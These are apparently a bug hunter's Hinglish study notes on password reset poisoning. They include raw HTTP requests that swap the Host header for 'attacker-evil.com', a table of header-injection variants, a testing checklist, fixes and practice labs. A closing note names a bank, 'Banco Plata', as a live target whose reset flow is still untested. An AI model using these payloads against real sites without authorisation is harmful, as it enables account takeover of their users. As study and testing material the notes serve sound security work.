# Password Reset Poisoning — Deep Dive

> Sub-topic of: Authentication / Account Takeover
> Root trust broken: Server `Host` (ya related) header ko legit domain maan leta hai bina validate kiye

---

## 1. Normal Flow (Baseline Samjho Pehle)

1. User "Forgot Password" click karta hai, apna email daalta hai
2. Server ek unique reset **token** generate karta hai (e.g., `a8f3c9...`)
3. Server email bhejta hai: `https://target.com/reset-password?token=a8f3c9...`
4. User email mein link click karta hai → apna password reset kar leta hai

---

## 2. Vulnerability Root Cause

Server ko reset link ka **domain** kahin se lena padta hai. Kuch applications ye domain **request ke `Host` header se dynamically generate** karte hain — flexibility ke liye (multi-domain/subdomain deployments).

**Broken trust assumption:** *"Host header hamesha genuine legit domain hi hoga."*

Reality: `Host` header ek **client-controlled** value hai — attacker ise Burp Repeater mein jo chahe likh sakta hai.

---

## 3. Attack Walkthrough (Step-by-Step)

### Step 1 — Normal reset request capture karo (Burp Proxy)
```
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

### Step 2 — `Host` header ko apne attacker-controlled domain se replace karo
```
POST /forgot-password HTTP/1.1
Host: attacker-evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

### Step 3 — Agar app vulnerable hai, victim ko ye email milega
```
https://attacker-evil.com/reset-password?token=a8f3c9...
```

### Step 4 — Exploitation ke do scenarios
- **Victim click kare (phishing angle):** real reset-token attacker ke server access logs mein aa jaata hai (URL param/Referer se) → attacker uss token se victim ka password khud reset kar deta hai
- **Victim ko click karne ki zaroorat nahi:** agar token kahin aur (analytics, caching proxy, Referer leakage) se bhi attacker tak pahunch jaaye

---

## 4. Variations — Sirf `Host` Header Hi Nahi

| Technique | Kya Karte Ho |
|---|---|
| **Basic Host header injection** | `Host: attacker.com` |
| **X-Forwarded-Host header** | `Host: target.com` rakho, extra `X-Forwarded-Host: attacker.com` add karo — reverse-proxy setups mein isko trust kiya jaata hai instead of Host |
| **X-Forwarded-Server / X-Host** | Kam common but legacy apps mein kaam karte hain |
| **Duplicate Host headers** | Do `Host` headers bhejo — kuch parsers pehla lete hain, kuch doosra (inconsistent parsing exploit) |
| **Absolute URL in request line** | `POST https://target.com/forgot-password HTTP/1.1` likh ke `Host` alag rakho — kuch servers request-line ka URL priority mein le lete hain |
| **Port manipulation** | `Host: target.com:attacker.com` ya `Host: target.com@attacker.com` (parsing confusion) |

---

## 5. Real Impact

- **Full account takeover** — attacker victim ka password khud set kar sakta hai
- Agar victim admin/high-privilege account hai → **privilege escalation** bhi possible
- Chain scenario: agar token URL mein hi hota hai (query param), aur attacker apne server ke access logs se token nikal le, to victim ko click karne ki bhi zaroorat nahi

---

## 6. Testing Checklist (Practical, Step-by-Step)

1. Forgot-password request Burp mein capture karo
2. `Host` header replace karke Repeater se resend karo — apna **Burp Collaborator** domain use karo (track karega ki request aayi ya nahi)
3. Agar Collaborator pe hit milta hai → confirmed vulnerable, ab email-based full exploitation try karo (apne test account pe pehle)
4. `X-Forwarded-Host` header add karke same test repeat karo — kai baar `Host` protected hota hai but `X-Forwarded-Host` nahi
5. Response body bhi check karo — kabhi reset link seedha response mein hi return ho jaata hai (email ki zaroorat hi nahi padti)

---

## 7. Fix / Root Cause (Reporting Mein Mention Karne Ke Liye)

- Reset link ka domain kabhi bhi request headers se derive nahi karna chahiye
- Server-side hardcoded/whitelisted domain use karna chahiye
- Agar multi-domain support chahiye, `Host` header ko strict allowlist ke against validate karna chahiye

---

## 8. Practice Labs

- PortSwigger Web Security Academy → **"Password reset poisoning via middleware"**
- PortSwigger Web Security Academy → **"Password reset poisoning via dangling markup"**
- Dono free labs hain, hands-on Burp Collaborator ke saath try karo

---

## 9. Live Target Notes

- **Banco Plata:** Cloudflare WAF ne pehle X-Original-URL/X-Forwarded-Host header injection block kiya tha ek doosre context mein, lekin ye specific password-reset flow abhi tak untested hai — fresh angle
